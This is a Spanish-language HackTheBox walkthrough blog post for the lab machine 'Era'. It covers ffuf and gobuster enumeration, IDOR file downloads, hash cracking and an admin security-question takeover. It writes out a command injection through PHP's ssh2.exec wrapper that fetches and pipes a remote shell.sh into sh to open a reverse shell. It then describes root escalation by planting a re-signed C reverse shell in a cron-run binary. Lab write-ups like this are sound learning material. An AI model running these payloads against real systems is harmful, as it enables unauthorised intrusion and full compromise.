+++ 
draft = false
date = 2025-08-03T15:38:58+02:00
title = "Guía de Era en HackTheBox"
description = "Un tutorial para la máquina HTB \"Era\""
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="files/title.png" alt="Title card">}}

Bienvenidos, hoy resolveremos la máquina "Era" de HackTheBox:

# Reconocimiento básico

Durante el primer escaneo, encontraremos los puertos 21 y 80 abiertos:

{{<betterfigure src="./files/nmap.png" alt="Nmap scan">}}

Al acceder al puerto HTTP, es fácil decir que se trata de un sitio web completamente estático, claramente tendremos que buscar en otro lugar.

{{<betterfigure src="./files/website.png" alt="Frontend">}}

## Buscando VHosts:

Como está claro que debemos buscar sitios web alternativos dentro del servidor, usaremos ffuf para solucionar el problema con el siguiente comando:

```bash
ffuf -p 0.1 -c -r -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://era.htb -H "Host: FUZZ.era.htb" -fs 19493
```

> Los sitios web suelen dar tamaños de respuesta genéricos que podemos filtrar con `-fs ${GENERIC_SIZE}`.

{{<betterfigure src="./files/vhost.png" alt="Ffuf fuzzing">}}

Parece que ffuf encontró una entrada oculta detrás del subdominio "file", si lo agregamos a nuestro archivo `/etc/hosts` nos encontraremos con el siguiente sitio web:

{{<betterfigure src="./files/filewebsite.png" alt="File website">}}

# Ganando un punto de apoyo

La parte más interesante es la capacidad de iniciar sesión usando preguntas de seguridad, sin embargo, no tenemos nada de información con la que aprovecharnos de este sistema:

{{<betterfigure src="./files/securityqa.png" alt="Security questions">}}

A primera vista puede parecer que solo podemos iniciar sesión en cuentas existentes, pero si ejecutamos el siguiente escaneo con gobuster, este revelará la existencia de una página para registrarnos:

```bash
gobuster dir --url http://file.era.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -xl 6765
```

> Al igual que con ffuf, gobuster también requiere el parámetro `-xl ${GENERIC_SIZE}` para filtrar las respuestas no válidas.

{{<betterfigure src="./files/gobuster.png" alt="Do people even read these?">}}

## Divirtiéndonos con IDOR:

Después de registrarnos en el servicio, finalmente podemos comenzar a hablar sobre su propósito, el cuál parece ser subir y compartir archivos:

{{<betterfigure src="./files/filelogin.png" alt="I'm guessing not">}}

Al subir un archivo, se nos da un enlace que apunta al ID de ese mismo archivo, por lo que intentaremos acceder a otros archivos una vez más utilizando ffuf:

{{<betterfigure src="./files/idortest.png" alt="So how are you?">}}

Podemos usar `seq 0 451 > numbers.txt` para generar una wordlist con la que intentar acceder a todos los identificadores hasta el de nuestro propio archivo, y luego emparejarlo con ffuf, llevándonos a encontrar dos archivos válidos *(450 siendo nuestra propio archivo)*.

```bash
ffuf -p 0.1 -c -r -b 'PHPSESSID=${YOUR_COOKIE}' -w numbers.txt -u http://file.era.htb/download.php?id=FUZZ -fs 7686
```

{{<betterfigure src="./files/idorsuccess.png" alt="Me I'm still alive">}}

> Recuerda filtrar los tamaños de respuesta e incluir tu cookie PHPSESSID al intentar usar ffuf aquí.

Al descargar los dos archivos, podemos ver que uno es una copia de seguridad del sitio web conteniendo el código fuente de este mismo junto a una base de datos sqlite.

{{<betterfigure src="./files/backup.png" alt="I don't know about you">}}

Al abrir la base de datos con sqlitebrowser podemos encontrar una tabla "users" que incluye todos los datos de los usuarios existentes en el momento de la copia de seguridad, incluidos hashes de contraseñas, respuestas a preguntas de seguridad y nombres de usuario. Podrías pensar que ahora deberíamos intentar probar las preguntas de seguridad, sin embargo, la respuesta es mucho más simple. Pero primero, intentemos descifrar los hashes.

{{<betterfigure src="./files/db.png" alt="But if you're reading this I guess you're also okay">}}

Desafortunadamente, solo pudimos descifrar 2 de los 6 hashes usando nuestra lista de palabras rockyou.txt ***(el primero perteneciente a "eric" y el segundo a "yuri")***, pero no pasa nada, ya que estos serán suficientes para más adelante.

{{<betterfigure src="./files/hashes.png" alt="">}}

## ¿Por qué existe esto?

Durante el tiempo explorando el portal ***file.era.htb***, probablemente pasástes por alto la pestaña "Update security questions" y la ignorastes pensando que era solo un formulario normal de "Cambiar contraseña", excepto para preguntas de seguridad, pero si miras más de cerca, te darás cuenta de que este formulario también incluye "Username".

{{<betterfigure src="./files/why.png" alt="Wherever you are, take care">}}

Si intentamos ingresar el nombre de usuario de administrador que encontramos en la base de datos...

{{<betterfigure src="./files/adminchange.png" alt="Security questions modified">}}

Descubriremos que en realidad podemos cambiar las preguntas de seguridad para otros usuarios, incluidas las del administrador:

{{<betterfigure src="./files/adminchange1.png" alt="Security questions modified 2">}}

Ahora, si intentamos iniciar sesión con las nuevas preguntas de seguridad, nos encontraremos dentro de la cuenta de administrador.

{{<betterfigure src="./files/adminlogin.png" alt="Login success">}}

## Shell inversa complicada:

Poco después de iniciar sesión, probablemente te darás cuenta de que en realidad no hay mucho que podamos hacer como el administrador, mirando alrededor parece que no hay pestañas adicionales para administrar la aplicación con esta cuenta.

Mirando dentro del código fuente que encontramos junto al archivo de la base de datos, podemos encontrar estas líneas en `download.php` que indican la existencia de una función beta disponible solo para el administrador:

{{<betterfigure src="./files/vulncode.png" alt="Vulnerable code">}}

El parámetro `format` parece usarse para modificar la forma en que el sitio web muestra el proceso de descarga del archivo:

{{<betterfigure src="./files/vuln1.png" alt="Vuln demonstration">}}

Sin embargo, también podemos ver cómo el contenido de este parámetro se usa dentro de la función `fopen()` sin ningún tipo de saneamiento, que podemos explotar [de la siguiente manera:](https://www.php.net/manual/en/function.ssh2-exec.php)

```bash
curl -b 'PHPSESSID=${YOUR_COOKIE}' --path-as-is 'http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:${REPLACE_ME}@127.0.0.1/curl+http://10.10.x.x:8000/shell.sh|sh|'
```

> Recuerda reemplazar `${REPLACE_ME}` con la contraseña que descifrastes de yuri anteriormente.

{{<betterfigure src="./files/shell.png" alt="">}}

> Y también recuerda estabilizar la shell inversa con los siguientes comandos:
> ```bash
> python3 -c "importar pty; pty.spawn('/bin/bash')"
> export TERM=xterm
> # Pulsar Ctrl+Z
> stty raw -echo; Fg
> ```

Una vez dentro, podemos cambiar al usuario "eric" *(o ejecutar el comando ssh con las credenciales de eric)* y obtener la bandera **user.txt**:

{{<betterfigure src="./files/userflag.png" alt="User flag">}}

# PrivEsc:

Una vez dentro, podemos encontrar dentro de `/opt` un binario llamado "monitor" y un archivo de logs que aparentemente se genera a partir del mismo binario:

{{<betterfigure src="./files/opt.png" alt="/opt files">}}

Mirando de cerca, podemos ver que nuestro usuario "eric" está dentro del grupo "devs", lo que le da acceso de escritura al binario "monitor", y ejecutarlo parece realizar un escaneo normal del sistema.

{{<betterfigure src="./files/devs.png" alt="">}}

Revisando los archivos crontab públicos, a primera vista parece haber nada que llame a este archivo, aunque podemos usar [pspy](https://github.com/DominicBreuker/pspy) para verificar si se están ejecutando comandos periódicamente.

{{<betterfigure src="./files/pspy.png" alt="">}}

Como se puede ver, hay un cronjob que llama a un script dentro de `/root` que ejecuta el binario "monitor", sin embargo, es más complicado que eso, ya que hay otros comandos vinculados al script. Pero lo más importante es que el binario sobre el que tenemos control de escritura se ejecuta mediante UID=0 o root.

Pero antes que nada, debemos entender qué está pasando con los otros comandos, si ejecutamos `objcopy --dump-section.text_sig=./signature.bin /opt/AV/periodic-checks/monitor` podemos obtener un archivo de firma incrustado dentro del binario, y si ejecutamos los otros dos comandos...

{{<betterfigure src="./files/1.png" alt="">}}

Podemos ver que estos extraen la dirección de correo electrónico correctamente del archivo de firma, por lo que podemos suponer que el script se negará a ejecutar `/opt/AV/periodic-checks/monitor` si no puede verificar correctamente la firma, entonces, ¿qué podemos hacer al respecto?

## Aprendiendo a utilizar objcopy:

Así como el comando objcopy detectado por pspy nos permitió volcar la firma del binario, también podemos consultar el manual para encontrar esta línea adicional:

{{<betterfigure src="./files/2.png" alt="">}}

Con la firma en nuestras manos, podemos compilar un binario nosotros mismos, y añadir la firma usando objcopy para que el script confíe en nuestro propio binario, siendo en este caso una [shell inversa en C](https://github.com/izenynn/c-reverse-shell/blob/main/linux.c):

{{<betterfigure src="./files/rootflag.png" alt="">}}

Y ahí lo tienes, después de compilar e incrustar la firma a nuestro propia shell inversa, sobrescribimos el binario del monitor con el contenido del nuestro, y en breve aterrizamos en una shell justo encima de la bandera **root.txt**.

